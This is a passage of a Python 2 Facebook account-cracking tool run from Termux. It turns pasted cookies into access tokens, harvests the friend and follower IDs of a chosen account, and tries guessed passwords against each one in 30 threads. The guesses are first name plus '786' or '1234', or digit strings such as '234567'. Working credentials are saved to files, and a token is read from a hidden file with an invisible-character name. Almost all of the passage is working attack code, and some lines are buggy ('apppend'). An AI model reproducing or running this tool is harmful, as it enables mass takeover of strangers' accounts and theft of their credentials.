    print ('\x1b[1;37mLogin with id/pass')
    print (47 * '-')
    lid = raw_input('\x1b[1;92m Id/mail/no: ')
    pwds = raw_input(' \x1b[1;93mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + lid + '&pass=' + pwds).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            jutt_menu()
        elif 'www.facebook.com' in q['error']:
            print (' User must verify account before login')
            raw_input('\x1b[1;92m Press enter to try again ')
            log_menu()
        else:
            print (' Id/Pass may be wrong')
            raw_input(' \x1b[1;92mPress enter to try again ')
            log_menu()
    except:
        print ('')
        print ('\033[1;37mUpdate tool')
        log_menu()


def log_token():
    os.system('clear')
    print (logo)
    print ('\x1b[1;93mLogin with token\x1b[1;91m')
    print (47 * '-')
    tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;97m')
    print (47 * '-')
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    jutt_menu()


def log_cookie():
    os.system('clear')
    print (logo)
    print ('')
    print ('\x1b[1;31;1mLogin Cookies')
    print ('')
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        jutt_menu()
    except AttributeError:
        print ('')
        print ('\tInvalid cookies')
        print ('')
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ('')
        print ('\tInvalid cookies')
        print ('')
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ('')
        print ('\tInvalid cookies')
        print ('')
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()


def jutt_menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ('')
        print (logo)
        print ('\x1b[1;31;1mLogin FB id to continue')
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print (logo)
        print ('')
        print ('\t Account Cheekpoint\x1b[0;97m')
        print ('')
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print (logo)
        print ('')
        print ('\t Turn on mobile data/wifi\x1b[0;97m')
        print ('')
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        jutt_menu()

    os.system('clear')
    print (logo)
    tok = open('/data/data/com.termux/files/usr/share/doc/xz/examples/.‎‎xozofile', 'r').read()
    print ('  \x1b[1;92mLogged in user: \x1b[1;92m' + z)
    print (47 * '\x1b[1;97m-')
    print (' \x1b[1;94m Active token: \x1b[1;95m' + tok)
    print (47*"\033[1;97m-")
    print ("")
    print ("\033[1;93m~~~~~Cloning Menu~~~~~\033[1;97m")
    print (47*"-")
    print ("")
    print ('\x1b[1;92m[1]Localhost Cloning\n')
    print ('\x1b[1;92m[2]Without Localhost Cloning\n')
    print ('\x1b[1;92m[3]Make File Extract ids\n')
    print ('\x1b[1;92m[4]Join My WP Group\n')
    print ('\x1b[1;92m[0]Back\x1b[1;97m')
    print (47*'-')
    print ('\x1b[1;93mFor Any Problem Selct 4 Join My WP Group\x1b[1;97m')
    print (47*'-')
    print ('')
    jutt_select()


def jutt_select():
    js = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if js == '1':
        menu()
    elif js == '2':
        brand_menu()
    elif js == '3':
        juttex_menu()
    elif js == '4':
        os.system('xdg-open https://chat.whatsapp.com/D3Q3WpXWWbv4klHfVGZ4JK')
        jutt_menu()
    elif js == '0':
        main_menu()
    else:
        print ('')
        print ('\tSelect valid option')
        print ('')
        jutt_select()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ('')
        print (logo)
        print ('\x1b[1;31;1mLogin FB id to continue')
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print (logo)
        print ('')
        print ('\t Account Cheekpoint\x1b[0;97m')
        print ('')
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print (logo)
        print ('')
        print ('\t Turn on mobile data/wifi\x1b[0;97m')
        print ('')
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print (logo)
    tok = open('/data/data/com.termux/files/usr/share/doc/xz/examples/.‎‎xozofile', 'r').read()
    print ('  \x1b[1;92mLogged in user: \x1b[1;92m' + z)
    print (47 * '\x1b[1;97m-')
    print (' \x1b[1;94m Active token: \x1b[1;95m' + tok)
    print (47*"\033[1;97m-")
    print ("")
    print ("\033[1;93m~~~~~Localhost Cloning Menu~~~~~\033[1;97m")
    print (47*"-")
    print ("")
    print ('\x1b[1;92m[1] Crack with Auto Passw10')
    print ('\x1b[1;92m[2] Crack Choice Number Passw6')
    print ('\x1b[1;92m[3] Crack Choice Name + Number Passw8')
    print ('\x1b[1;92m[4] Crack Choice Name Passw4')
    print ('\x1b[1;92m[5] Make File Extract ids')
    print ('\033[1;92m[6] Join My WP Group\033[1;97m')
    print ('\033[1;92m[0] Back\033[1;97m')
    print ('')
    print (47*'-')
    print ('\033[1;93mFor Any Problem selct 6 And Join My WP Group\033[1;97m')
    print (47*'-')
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        name_crack()
    elif ms == '4':
        digit_crack()
    elif ms == '5':
        juttex_menu()
    elif ms == '6':
        os.system('xdg-open https://chat.whatsapp.com/D3Q3WpXWWbv4klHfVGZ4JK')
        menu()
    elif ms == '0':
        jutt_menu()
    else:
        print ('')
        print ('\tSelect valid option')
        print ('')
        menu_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\t Login FB id to continue\x1b[0;97m')
        print ('')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print (logo)
    print ("")
    print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
    print ('')
    print (47*'-')
    print ('\x1b[1;93m~~~~ Auto Pass Cracking ~~~~\x1b[1;97m')
    print (47 * '-')
    print ('\x1b[1;92m[1] Public id cloning')
    print ('\x1b[1;92m[2] Followers cloning')
    print ('\x1b[1;92m[3] File cloning')
    print ('\x1b[1;92m[0] Back\x1b[1;97m')
    print (47 * '-')
    ac_s()


def ac_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print (logo)
        print('')
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;93m~~~~ Auto pass public cracking ~~~~\x1b[1;97m')
        print (47*'-')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print('')
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m ~~~~ Auto Pass Public Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ("")
            print ('\x1b[1;92m Cloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92m Press enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print (logo)
        print('')
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;93m~~~~ Auto Pass Followers Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print('')
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~ Auto Pass Followers Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print (' \x1b[1;92mCloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92mPress enter to try again \x1b[1;97m')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print (logo)
        print('')
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~ Auto Pass File Cracking ~~~~\x1b[1;97m')
        print (47 * '-')
        try:
            idlist = raw_input(' \x1b[1;96m File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found.')
            raw_input('\x1b[1;92mPress Enter To Back. \x1b[1;97m')
            auto_crack()

    elif a_s == '0':
        menu()
    else:
        print ('')
        print ('\x1b[1;97mChoose valid option')
        ac_s()
    print (' \x1b[1;92mTotal ids: \x1b[1;92m ' + str(len(id)))
    time.sleep(0.5)
    print (' \x1b[1;97mCrack Running\x1b[1;97m ')
    time.sleep(0.5)
    print (47 * '-')
    print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    def main(arg):
        user = arg
        uid, name = user.split('|')
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            pass1 = name.lower() + '786'
            data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m')
                ok = open('JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    ok = open('JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '123'
                    data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        ok = open('JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '12'
                        data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            ok = open('JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '234567'
                            data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                ok = open('JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '223344'
                                data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    ok = open('JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m')
                                        ok = open('JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m')
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m')
                                            ok = open('JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m')
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '786786786'
                                            data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m')
                                                ok = open('JUTT_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass9 + '\x1b[0;97m')
                                                cp = open('JUTT_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '786000'
                                                data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m')
                                                    ok = open('JUTT_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass10 + '\x1b[0;97m')
                                                    cp = open('JUTT_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;92mCrack Done')
    print (' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\033[1;97m-')
    raw_input(' \x1b[1;93mPress enter to back\x1b[0;97m')
    menu()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\x1b[1;93m~~~ Login FB id to continue ~~~')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print (logo)
    print("")
    print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
    print (47*'-')
    print ('\x1b[1;33m~~~~ Digit Choice Pass Cracking ~~~~\x1b[1;97m')
    print (47 * '-')
    print ('\x1b[1;92m[1] Public id cloning')
    print ('\x1b[1;92m[2] Followers cloning')
    print ('\x1b[1;92m[3] File cloning')
    print ('\x1b[1;92m[0] Back\x1b[1;97m')
    print (47 * '-')
    cc_s()


def cc_s():
    id = []
    cps = []
    oks = []
    c_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if c_s == '1':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m ~~~~Digit Choice Pass Public cracking~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96m For example:234567,223344,334455,445566\x1b[1;97m')
        print (47 * '-')
        pass1 = raw_input(' \x1b[1;92m[1]Password: \x1b[1;37m')
        pass2 = raw_input(' \x1b[1;92m[2]Password: \x1b[1;37m')
        pass3 = raw_input(' \x1b[1;92m[3]Password: \x1b[1;37m')
        pass4 = raw_input(' \x1b[1;92m[4]Password: \x1b[1;37m')
        pass5 = raw_input(' \x1b[1;92m[5]Password: \x1b[1;37m')
        pass6 = raw_input(' \x1b[1;92m[6]password: \x1b[1;37m')
        idt = raw_input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m ~~~~ Digit Choice Pass Public Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ("")
            print ('\x1b[1;92m Cloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92m Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif c_s == '2':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m~~~~Digit Choice Pass Followers Cracking~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96m For example:234567,223344,334455,445566\x1b[1;97m')
        print (47 * '-')
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        idt = raw_input(' \x1b[1;96mEnter id: \x1b[0;97m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print (logo)
            print("")
            print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
            print (47*'-')
            print ('\x1b[1;33m~~~~ Digit Choice Pass Followers Cracking ~~~~\x1b[1;97m')
            print (47*'-')
            print ('')
            print ('\x1b[1;92m Cloning from: ' + z)
        except (KeyError, IOError):
            print ('\t Invalid user \x1b[0;97m')
            raw_input('\x1b[1;92mPress enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif c_s == '3':
        os.system('clear')
        print (logo)
        print("")
        print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
        print (47*'-')
        print ('\x1b[1;33m ~~~~Digit Choice Pass File cracking~~~~\x1b[1;97m')
        print (47 * '-')
        print ('\x1b[1;96m For example:234567,223344,334455,445566\x1b[1;97m')
        print (47 * '-')
        pass1 = raw_input(' \x1b[1;92m[1]Password: \x1b[1;37m')
        pass2 = raw_input(' \x1b[1;92m[2]Password: \x1b[1;37m')
        pass3 = raw_input(' \x1b[1;92m[3]Password: \x1b[1;37m')
        pass4 = raw_input(' \x1b[1;92m[4]Password: \x1b[1;37m')
        pass5 = raw_input(' \x1b[1;92m[5]Password: \x1b[1;37m')
        pass6 = raw_input(' \x1b[1;92m[6]Password: \x1b[1;37m')
        try:
            idlist = raw_input(' \x1b[1;96m[+] File Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print ('[!] File Not Found.')
            raw_input('\x1b[1;92mPress Enter To Back. ')
            choice_crack()

    elif c_s == '0':
        menu()
    else:
        print ('')
        print ('\x1b[1;97m Choose valid option')
        cc_s()
    print (' \x1b[1;92mTotal ids: \x1b[1;92m ' + str(len(id)))
    time.sleep(0.5)
    print (' \x1b[1;97m~~~ Crack Running ~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
    time.sleep(0.5)
    print (47 * '-')
    def main(arg):
        user = arg
        uid, name = user.split('|')
        ua = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ua})
        try:
            data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m')
                ok = open('JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m')
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    ok = open('JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m')
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        ok = open('JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m')
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            ok = open('JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m')
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                ok = open('JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m')
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = session.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print ('\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    ok = open('JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print ('\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m')
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print (47 * '-')
    print (' \x1b[1;92mCrack Done')
    print ('\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps)))
    print (47 * '\x1b[1;97m-')
    raw_input('\x1b[1;93m Press enter to back\x1b[0;97m')
    menu()


def name_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print (logo)
        print ('\t Login FB id to continue\x1b[0;97m')
        print ('')
        time.sleep(1)
        log_menu()

    os.system('clear')
    print (logo)
    print("")
    print ('\x1b[1;93m~~~Localhost Cloning Menu~~~\x1b[1;97m')
    print (47*'-')
    print ('\x1b[1;33m~~~~ Name + Digit Pass Cracking ~~~~\x1b[1;97m')
    print (47 * '-')
    print ('\x1b[1;92m[1] Public id cloning')
